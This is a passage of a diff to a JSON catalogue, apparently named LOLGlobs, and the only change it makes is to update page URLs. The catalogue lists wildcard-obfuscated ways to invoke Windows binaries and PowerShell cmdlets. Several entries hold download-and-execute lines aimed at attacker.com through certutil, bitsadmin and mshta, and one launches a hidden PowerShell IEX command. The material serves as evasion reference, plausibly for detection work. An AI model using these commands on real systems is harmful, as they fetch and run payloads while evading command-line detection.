-    "url": "http://localhost:4000/globs/powershell/invoke-webrequest/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/invoke-webrequest/"
   },
   {
     "name": "New-Object",
@@ -349,7 +349,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 5,
     "patterns": [{"Pattern":"& (gcm N*-O*) System.Net.WebClient","Wildcards":["*"],"Notes":"Wildcards on both verb and noun"},{"Pattern":"& (gcm New-Ob*) System.Net.WebClient","Wildcards":["*"],"Notes":"Star matches 'ject'"},{"Pattern":"& (gcm N?w-Object) System.Net.WebClient","Wildcards":["?"],"Notes":"Single char wildcard replaces 'e'"},{"Pattern":"(& (gcm N*-O*) Net.WebClient).DownloadFile('http://...','C:\\p.exe')","Wildcards":["*"],"Notes":"Full download one-liner with glob-resolved cmdlet"},{"Pattern":"& (gcm *Object) Net.WebClient","Wildcards":["*"],"Notes":"Prefix wildcard"}],
-    "url": "http://localhost:4000/globs/powershell/new-object/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/new-object/"
   },
   {
     "name": "Set-Content",
@@ -360,7 +360,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 5,
     "patterns": [{"Pattern":"& (gcm S*-C*t) -Path C:\\payload.ps1 -Value $code","Wildcards":["*"],"Notes":"Wildcards in both verb and noun"},{"Pattern":"& (gcm Set-Con*) -Path ...","Wildcards":["*"],"Notes":"Star matches 'tent'"},{"Pattern":"& (gcm S?t-Content) -Path ...","Wildcards":["?"],"Notes":"Single char wildcard replaces 'e'"},{"Pattern":"& (gcm *-Content) -Path ...","Wildcards":["*"],"Notes":"Prefix wildcard — note: also matches Get-Content"},{"Pattern":"sc -Path C:\\file.txt -Value 'data'","Wildcards":[],"Notes":"Alias 'sc' (note: conflicts with sc.exe service control)"}],
-    "url": "http://localhost:4000/globs/powershell/set-content/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/set-content/"
   },
   {
     "name": "Start-Process",
@@ -371,7 +371,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 6,
     "patterns": [{"Pattern":"& (gcm S*-P*ess) -FilePath cmd.exe","Wildcards":["*"],"Notes":"Wildcards in verb and noun"},{"Pattern":"& (gcm Start-Pro*) -FilePath ...","Wildcards":["*"],"Notes":"Star matches 'cess'"},{"Pattern":"& (gcm S?art-Process) -FilePath ...","Wildcards":["?"],"Notes":"Single char wildcard replaces 't'"},{"Pattern":"& (gcm *-Process) -FilePath ...","Wildcards":["*"],"Notes":"Prefix wildcard"},{"Pattern":"saps -FilePath cmd.exe","Wildcards":[],"Notes":"Built-in alias 'saps' for Start-Process"},{"Pattern":"& (gcm *rocess) cmd.exe","Wildcards":["*"],"Notes":"Short suffix pattern"}],
-    "url": "http://localhost:4000/globs/powershell/start-process/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/start-process/"
   },
   {
     "name": "Test-Connection",
@@ -382,7 +382,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 4,
     "patterns": [{"Pattern":"& (gcm T*-C*n) -ComputerName 192.168.1.1","Wildcards":["*"],"Notes":"Wildcards in both verb and noun"},{"Pattern":"& (gcm Test-Con*) -ComputerName ...","Wildcards":["*"],"Notes":"Star matches 'nection'"},{"Pattern":"& (gcm T?st-Connection) -ComputerName ...","Wildcards":["?"],"Notes":"Single char wildcard replaces 'e'"},{"Pattern":"& (gcm *Connection) -ComputerName ...","Wildcards":["*"],"Notes":"Prefix wildcard"}],
-    "url": "http://localhost:4000/globs/powershell/test-connection/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/test-connection/"
   },
   {
     "name": "bitsadmin",
@@ -393,7 +393,7 @@
     "binaryPath": ["C:\\Windows\\System32\\bitsadmin.exe"],
     "patternCount": 4,
     "patterns": [{"Pattern":"for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe","Wildcards":["*"],"Notes":"Star matches 'admin' after 'bits'"},{"Pattern":"for /f %i in ('where b*admin.exe') do %i","Wildcards":["*"],"Notes":"Star replaces 'its'"},{"Pattern":"for /f %i in ('where bitsad?in.exe') do %i","Wildcards":["?"],"Notes":"Single char wildcard replaces 'm'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\bits*.exe') do %i","Wildcards":["*"],"Notes":"dir /b with glob pattern"}],
-    "url": "http://localhost:4000/globs/windows-cmd/bitsadmin/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/bitsadmin/"
   },
   {
     "name": "certutil",
@@ -404,7 +404,7 @@
     "binaryPath": ["C:\\Windows\\System32\\certutil.exe"],
     "patternCount": 5,
     "patterns": [{"Pattern":"for /f %i in ('where c*til.exe') do %i -urlcache -split -f http://attacker.com/payload.exe C:\\payload.exe","Wildcards":["*"],"Notes":"CMD requires 'where' + for loop since glob doesn't work in command position. Star matches 'er' + 'u'"},{"Pattern":"for /f %i in ('where cert?til.exe') do %i","Wildcards":["?"],"Notes":"Single char wildcard in where query"},{"Pattern":"for /f %i in ('where certutil*') do %i","Wildcards":["*"],"Notes":"Trailing star matches '.exe' and variant names"},{"Pattern":"cmd /c for /f %i in ('dir /b C:\\Windows\\System32\\cert*.exe') do %i","Wildcards":["*"],"Notes":"Using dir /b with glob to find binary"},{"Pattern":"for /f %i in ('where /r C:\\Windows c*til.exe') do %i","Wildcards":["*"],"Notes":"Recursive where search with wildcard"}],
-    "url": "http://localhost:4000/globs/windows-cmd/certutil/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/certutil/"
   },
   {
     "name": "cmd",
@@ -415,7 +415,7 @@
     "binaryPath": ["C:\\Windows\\System32\\cmd.exe","C:\\Windows\\SysWOW64\\cmd.exe"],
     "patternCount": 5,
     "patterns": [{"Pattern":"for /f %i in ('where cm?.exe') do %i /c whoami","Wildcards":["?"],"Notes":"Wildcard replaces 'd'"},{"Pattern":"for /f %i in ('where c*d.exe') do %i","Wildcards":["*"],"Notes":"Star matches 'm'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\cm?.exe') do %i","Wildcards":["?"],"Notes":"dir glob search with wildcard"},{"Pattern":"%COMSPEC%","Wildcards":[],"Notes":"Environment variable resolves to cmd.exe path — not a glob but a common evasion"},{"Pattern":"for /f %i in ('where cmd*') do %i /c ...","Wildcards":["*"],"Notes":"Star suffix matches cmd.exe"}],
-    "url": "http://localhost:4000/globs/windows-cmd/cmd/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/cmd/"
   },
   {
     "name": "mshta",
@@ -426,7 +426,7 @@
     "binaryPath": ["C:\\Windows\\System32\\mshta.exe","C:\\Windows\\SysWOW64\\mshta.exe"],
     "patternCount": 4,
     "patterns": [{"Pattern":"for /f %i in ('where mshta*') do %i http://attacker.com/payload.hta","Wildcards":["*"],"Notes":"Star matches '.exe'"},{"Pattern":"for /f %i in ('where m*ta.exe') do %i","Wildcards":["*"],"Notes":"Star replaces 'sh'"},{"Pattern":"for /f %i in ('where ms?ta.exe') do %i","Wildcards":["?"],"Notes":"Single char wildcard replaces 'h'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\ms*ta.exe') do %i","Wildcards":["*"],"Notes":"dir glob search"}],
-    "url": "http://localhost:4000/globs/windows-cmd/mshta/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/mshta/"
   },
   {
     "name": "powershell.exe",
@@ -437,7 +437,7 @@
     "binaryPath": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"],
     "patternCount": 4,
     "patterns": [{"Pattern":"for /f %i in ('where powers*') do %i -nop -w hidden -c IEX(...)","Wildcards":["*"],"Notes":"Star matches 'hell.exe'"},{"Pattern":"for /f %i in ('where power?hell.exe') do %i","Wildcards":["?"],"Notes":"Wildcard replaces 's'"},{"Pattern":"for /f %i in ('where p*hell.exe') do %i","Wildcards":["*"],"Notes":"Star matches 'owers'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\power*.exe') do %i","Wildcards":["*"],"Notes":"Full path dir glob"}],
-    "url": "http://localhost:4000/globs/windows-cmd/powershell-exe/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/powershell-exe/"
   },
   {
     "name": "regsvr32",
@@ -448,7 +448,7 @@
     "binaryPath": ["C:\\Windows\\System32\\regsvr32.exe","C:\\Windows\\SysWOW64\\regsvr32.exe"],
     "patternCount": 4,
     "patterns": [{"Pattern":"for /f %i in ('where regsvr3?.exe') do %i","Wildcards":["?"],"Notes":"Wildcard replaces '2'"},{"Pattern":"for /f %i in ('where r*svr32.exe') do %i","Wildcards":["*"],"Notes":"Star replaces 'eg'"},{"Pattern":"for /f %i in ('where regsvr*.exe') do %i","Wildcards":["*"],"Notes":"Star matches '32'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\regsvr*.exe') do %i","Wildcards":["*"],"Notes":"dir glob search"}],
-    "url": "http://localhost:4000/globs/windows-cmd/regsvr32/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/regsvr32/"
   },
   {
     "name": "rundll32",
@@ -459,7 +459,7 @@
     "binaryPath": ["C:\\Windows\\System32\\rundll32.exe","C:\\Windows\\SysWOW64\\rundll32.exe"],
     "patternCount": 4,
     "patterns": [{"Pattern":"for /f %i in ('where rundll3?.exe') do %i","Wildcards":["?"],"Notes":"Wildcard replaces '2'"},{"Pattern":"for /f %i in ('where r*32.exe') do %i","Wildcards":["*"],"Notes":"Star matches 'undll'"},{"Pattern":"for /f %i in ('where rundll*.exe') do %i","Wildcards":["*"],"Notes":"Star matches '32'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\rundll*.exe') do %i","Wildcards":["*"],"Notes":"dir glob search"}],
-    "url": "http://localhost:4000/globs/windows-cmd/rundll32/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/rundll32/"
   },
   {
     "name": "wmic",
@@ -470,6 +470,6 @@
     "binaryPath": ["C:\\Windows\\System32\\wbem\\wmic.exe"],
     "patternCount": 4,
     "patterns": [{"Pattern":"for /f %i in ('where wmi?.exe') do %i process call create cmd.exe","Wildcards":["?"],"Notes":"Wildcard replaces 'c'"},{"Pattern":"for /f %i in ('where w*c.exe') do %i","Wildcards":["*"],"Notes":"Star matches 'mi'"},{"Pattern":"for /f %i in ('dir /b C:\\Windows\\System32\\wbem\\wmi?.exe') do %i","Wildcards":["?"],"Notes":"Full path dir glob"},{"Pattern":"for /f %i in ('where wmic*') do %i","Wildcards":["*"],"Notes":"Trailing star matches '.exe'"}],
-    "url": "http://localhost:4000/globs/windows-cmd/wmic/"
+    "url": "http://localhost:4000/LOLGlobs/globs/windows-cmd/wmic/"
   }
 ]
